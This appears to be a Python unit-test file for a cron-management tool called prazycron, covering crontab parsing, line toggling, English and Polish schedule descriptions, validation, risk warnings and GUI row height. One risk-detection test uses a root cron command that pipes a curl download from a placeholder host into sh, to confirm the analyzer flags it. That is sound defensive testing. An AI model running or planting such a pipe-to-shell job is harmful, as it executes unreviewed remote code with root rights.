from __future__ import annotations

import unittest

from prazycron.analyzer import analyze, describe_schedule, describe_schedule_pl, humanize_schedule, validate_schedule
from prazycron.cron import DISABLED_PREFIX, append_line, parse_crontab_text, render_line, replace_line, toggle_line
from prazycron.model import CronEntry
from prazycron.gui import calculate_tree_row_height


class CronParserTests(unittest.TestCase):
    def test_comments_are_not_tasks(self) -> None:
        text = "# ordinary comment\nSHELL=/bin/bash\n17 * * * * /usr/bin/example\n"
        entries = parse_crontab_text(text, "crontab:user", "user_crontab", "testuser")
        self.assertEqual(len(entries), 1)
        self.assertEqual(entries[0].command, "/usr/bin/example")

    def test_disabled_marker_is_a_task(self) -> None:
        text = f"{DISABLED_PREFIX}0 3 * * * /usr/bin/backup\n"
        entries = parse_crontab_text(text, "crontab:user", "user_crontab", "testuser")
        self.assertEqual(len(entries), 1)
        self.assertFalse(entries[0].enabled)

    def test_system_format_has_user(self) -> None:
        entries = parse_crontab_text("0 1 * * * root /usr/bin/test\n", "/etc/crontab", "system_file", "root")
        self.assertEqual(entries[0].user, "root")
        self.assertEqual(entries[0].command, "/usr/bin/test")

    def test_render_and_toggle(self) -> None:
        line = render_line("0 3 * * *", "/usr/bin/test", "testuser", False, True)
        self.assertEqual(line, "0 3 * * * /usr/bin/test")
        disabled = toggle_line(line, False)
        self.assertTrue(disabled.startswith(DISABLED_PREFIX))
        self.assertEqual(toggle_line(disabled, True), line)

    def test_replace_and_append_preserve_text(self) -> None:
        original = "# heading\n0 1 * * * /bin/a\n"
        changed = replace_line(original, 1, "0 2 * * * /bin/b")
        self.assertEqual(changed, "# heading\n0 2 * * * /bin/b\n")
        self.assertTrue(append_line(changed, "0 3 * * * /bin/c").endswith("/bin/c\n"))


class AnalyzerTests(unittest.TestCase):
    def test_schedule_descriptions(self) -> None:
        self.assertEqual(describe_schedule("* * * * *"), "every minute")
        self.assertEqual(describe_schedule("0 3 * * *"), "once a day at 03:00")
        self.assertEqual(describe_schedule("@reboot"), "at system startup")


    def test_human_friendly_polish_schedule_labels(self) -> None:
        self.assertEqual(humanize_schedule("0 3 * * *", "pl"), "Raz dziennie o 03:00")
        self.assertEqual(humanize_schedule("30 3 * * 0", "pl"), "Co tydzień w niedzielę o 03:30")
        self.assertEqual(humanize_schedule("30 7-23 * * *", "pl"), "Co godzinę od 07:30 do 23:30, codziennie")
        self.assertEqual(describe_schedule_pl("0 3 1 * *"), "raz w miesiącu, 1. dnia o 03:00")

    def test_validation(self) -> None:
        self.assertFalse(validate_schedule("0 3 * * *"))
        self.assertTrue(validate_schedule("99 3 * * *"))

    def test_risk_detection(self) -> None:
        entry = CronEntry(True, "* * * * *", "curl https://example.invalid/x | sh", "root", "crontab:root", "root_crontab", 0, "")
        result = analyze(entry)
        self.assertTrue(any("downloaded content" in warning for warning in result.warnings))
        self.assertTrue(any("overlapping" in warning for warning in result.warnings))

    def test_detailed_polish_analysis(self) -> None:
        entry = CronEntry(True, "09,39 * * * *", "/usr/bin/run-parts --report /etc/cron.hourly", "root", "/etc/crontab", "system_file", 0, "")
        result = analyze(entry, language="pl")
        self.assertIn("Znaczenie harmonogramu", result.sections)
        self.assertIn("48 razy na dobę", result.sections["Częstotliwość"])
        self.assertIn("run-parts", result.as_text())


class GuiLayoutTests(unittest.TestCase):
    def test_row_height_grows_with_font_metrics(self) -> None:
        self.assertEqual(calculate_tree_row_height(40, 36, 20), 52)
        self.assertEqual(calculate_tree_row_height(70, 20, 20), 70)


if __name__ == "__main__":
    unittest.main()
